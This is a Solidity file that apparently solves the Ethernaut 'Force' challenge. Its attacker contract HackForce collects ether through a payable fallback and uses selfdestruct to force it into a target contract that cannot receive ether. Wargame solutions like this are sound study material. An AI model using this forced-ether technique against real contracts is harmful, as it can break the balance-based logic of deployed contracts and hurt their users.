// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }


contract HackForce { 
    function selfde(address payable _to) external{
        selfdestruct(_to);
    }

    fallback() external payable {
    }
}